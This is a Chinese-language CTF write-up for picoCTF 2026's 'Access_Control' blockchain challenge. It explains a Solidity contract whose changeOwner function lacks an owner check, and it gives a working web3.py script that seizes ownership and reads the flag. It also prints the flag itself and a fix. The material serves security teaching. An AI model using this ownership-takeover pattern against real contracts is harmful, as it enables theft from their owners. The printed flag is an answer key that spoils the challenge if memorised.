# picoCTF 2026 - Access_Control Writeup

## 題目資訊
- 題目名稱：Access_Control
- 類型：Blockchain
- 難度：Medium

## Flag
`picoCTF{i_c4n_b3_0wn3r_e47378d8}`

## 題目概述
題目提供一份 Solidity 合約，聲稱只有 owner 才能取得 flag。目標是分析合約的權限控制缺陷，並透過鏈上互動取得 flag。

## 核心漏洞
合約中的 `changeOwner(address _newOwner)` 沒有做權限檢查：

```solidity
function changeOwner(address _newOwner) public {
    address oldOwner = owner;
    owner = _newOwner;
    emit OwnerChanged(oldOwner, _newOwner);
}
```

這代表任何人都可以直接把 `owner` 改成自己，而不是只有原 owner 才能更改。

## 影響分析
此漏洞屬於 Broken Access Control / Improper Authorization。

攻擊者可：
1. 任意奪取合約 owner 權限
2. 滿足 `solve()` 的 owner 檢查
3. 觸發 flag reveal
4. 透過 `getFlag()` 讀取敏感資料

## 利用流程

### 1. 取得題目提供資訊
題目 instance 提供以下資料：
- Eth node address
- Contract Address
- Player Private Key
- Player Address

### 2. 連線到題目鏈
使用 `web3.py` 連線至題目提供的 Eth node。

### 3. 奪取 owner
呼叫：

```python
changeOwner(player_address)
```

把 owner 改成自己的 player address。

### 4. 觸發 solve
呼叫：

```python
solve()
```

因為此時 `msg.sender == owner`，檢查會通過。

### 5. 取得 flag
最後呼叫：

```python
getFlag()
```

成功讀出 flag。

## Exploit Script
```python
from web3 import Web3

rpc_url = "http://lonely-island.picoctf.net:<ETH_NODE_PORT>"
private_key = "<PRIVATE_KEY>"
player = Web3.to_checksum_address("<PLAYER_ADDRESS>")
contract_address = Web3.to_checksum_address("<CONTRACT_ADDRESS>")

abi = [
    {
        "inputs": [{"internalType": "address", "name": "_newOwner", "type": "address"}],
        "name": "changeOwner",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "solve",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function"
    }
]

w3 = Web3(Web3.HTTPProvider(rpc_url))
acct = w3.eth.account.from_key(private_key)
contract = w3.eth.contract(address=contract_address, abi=abi)

nonce = w3.eth.get_transaction_count(acct.address)
gas_price = w3.eth.gas_price

tx1 = contract.functions.changeOwner(player).build_transaction({
    "from": acct.address,
    "nonce": nonce,
    "gas": 200000,
    "gasPrice": gas_price,
})
signed1 = acct.sign_transaction(tx1)
w3.eth.wait_for_transaction_receipt(
    w3.eth.send_raw_transaction(signed1.raw_transaction)
)

tx2 = contract.functions.solve().build_transaction({
    "from": acct.address,
    "nonce": nonce + 1,
    "gas": 200000,
    "gasPrice": gas_price,
})
signed2 = acct.sign_transaction(tx2)
w3.eth.wait_for_transaction_receipt(
    w3.eth.send_raw_transaction(signed2.raw_transaction)
)

flag = contract.functions.getFlag().call()
print(flag)
```

## 成功條件
執行成功後可觀察到：
- `changeOwner ok`
- `solve ok`
- `FLAG = picoCTF{i_c4n_b3_0wn3r_e47378d8}`

## 根因總結
開發者只在 `solve()` 內檢查 owner，卻忽略了 `changeOwner()` 本身也需要限制。這使得整個權限模型失效。

## 修補建議
在 `changeOwner()` 加上權限驗證：

```solidity
function changeOwner(address _newOwner) public {
    require(msg.sender == owner, "Only owner can change owner");
    address oldOwner = owner;
    owner = _newOwner;
    emit OwnerChanged(oldOwner, _newOwner);
}
```

可進一步搭配：
- OpenZeppelin `Ownable`
- 事件審計與敏感函式白名單
- 單元測試驗證未授權使用者不可修改 owner

## 學習重點
- 區塊鏈合約中的權限控制不能只檢查關鍵功能點
- 所有會改變權限狀態的函式都必須驗證呼叫者
- CTF blockchain 題常見重點包括：ownership、reentrancy、delegatecall、storage、tx.origin、簽章驗證
